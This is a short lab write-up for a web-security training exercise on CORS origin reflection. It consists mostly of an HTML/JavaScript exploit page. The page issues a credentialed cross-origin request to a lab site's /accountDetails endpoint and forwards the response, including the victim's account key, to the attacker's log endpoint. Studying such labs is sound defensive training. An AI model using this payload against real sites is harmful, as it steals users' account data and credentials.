# Lab-01: CORS vulnerability with basic origin reflection

```html
<html>
  <body>
    <script>
     
      var xhr = new XMLHttpRequest();
     
     var url = "https://0a3f002803cd30c7c0f931dd006f00dc.web-security-academy.net"
     
     xhr.onreadystatechange = function(){
          if(xhr.readyState == XMLHttpRequest.DONE){
             fetch("/log?key=" + xhr.responseText)
        }
      }
     
    
     xhr.open('GET', url + "/accountDetails" , true);
     xhr.withCredentials = true;
     xhr.send(null)
    </script>
  </body>
</html>
```
![cors-lab-1](https://user-images.githubusercontent.com/98345027/188303461-3f4cbfa8-f497-42f3-9e81-585962098571.png)
